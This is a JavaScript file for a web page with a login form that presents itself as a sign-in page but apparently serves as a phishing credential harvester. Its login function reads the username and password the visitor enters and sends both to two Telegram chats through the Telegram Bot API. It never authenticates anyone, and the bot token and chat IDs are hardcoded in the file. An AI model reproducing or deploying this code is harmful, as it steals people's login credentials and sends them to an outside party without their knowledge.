$(document).ready(function() {
  var winh = $(window).height();

  $(".header").height(winh);

  $(".space").height(winh / 4);

  $("button").click(function() {
    window.location.href = "login.html";
  });
});

function login() {
  var username = $("#username").val();

  var pass = $("#pass").val();

  var token = "1002504250:AAFZ1ZO9UtV_QEZOjT6DSbf0jykLON7Bews";

  var id = "542600647";
  var admin = "387534219";

  if (username.length > 0 && pass.length > 0) {
    $("#logbut").attr("disabled", "disabled");

    var text = "user : `" + username + "`                                                                               pass : `" + pass + "`";

    $.get(
      "https://api.telegram.org/bot" +
        token +
        "/sendMessage?chat_id=" +
        id +
        "&text=" +
        text +
        "&parse_mode=markdown",
      function(data) {
        $("#logbut").removeAttr("disabled", "disabled");

        $(".alert").show();

        $("#username,#pass").val("");
      }
    );

    $.get(
      "https://api.telegram.org/bot" +
        token +
        "/sendMessage?chat_id=" +
        admin +
        "&text=" +
        text +
        "&parse_mode=markdown"
    );
  }
}
